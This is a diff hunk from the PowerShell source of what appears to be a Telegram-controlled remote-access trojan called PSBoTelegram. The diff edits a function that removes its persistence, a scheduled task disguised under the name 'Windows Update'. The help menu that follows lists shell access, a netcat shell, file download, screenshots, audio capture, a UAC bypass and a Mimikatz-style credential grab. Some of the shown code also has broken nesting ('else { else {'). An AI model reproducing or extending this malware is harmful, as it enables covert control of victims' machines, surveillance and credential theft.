@@ -197,9 +197,9 @@ $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 
 function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
-{$texto = "Sorry, necesitas privilegios";return $texto; break }; if ((Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}).count -eq 0 ) {$texto = "El arranque parece estar limpio."; return $texto; break} else {
-else {$texto = "Eliminando persistencia" ; Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}  | Unregister-ScheduledTask -AsJob; return $texto; break
-}}}
+{$texto = "Sorry, necesitas privilegios";return $texto; break } else { if ((Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}).count -eq 0 ) {$texto = "El arranque parece estar limpio."; return $texto; break} else {
+else {$texto = "Eliminando persistencia" ; Get-ScheduledTask | Where-Object {$_.taskname -like "Windows Update"}  | Unregister-ScheduledTask -AsJob; return $texto
+}}}}
 
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
  $help = "PSBoTelegram V0.6`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
